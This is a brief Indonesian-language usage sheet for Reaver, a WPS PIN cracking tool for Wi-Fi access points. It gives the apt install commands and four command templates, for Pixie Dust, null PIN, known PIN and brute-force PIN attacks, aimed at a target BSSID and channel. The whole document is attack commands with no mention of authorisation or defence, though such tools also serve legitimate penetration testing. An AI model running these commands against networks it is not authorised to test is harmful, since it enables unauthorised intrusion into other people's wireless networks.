# Reaver

Homepage: [https://github.com/t6x/reaver-wps-fork-t6x](https://github.com/t6x/reaver-wps-fork-t6x)

## Cara Instal

```
sudo apt-get update
sudo apt-get install reaver
```

## Cara Menggunakan

#### Pixie Dust Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -K -vv
```

#### Null PIN Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -p "" -vv
```

#### Known PIN Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -p [pin] -vv
```

#### Brute Force PIN Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -vv
```

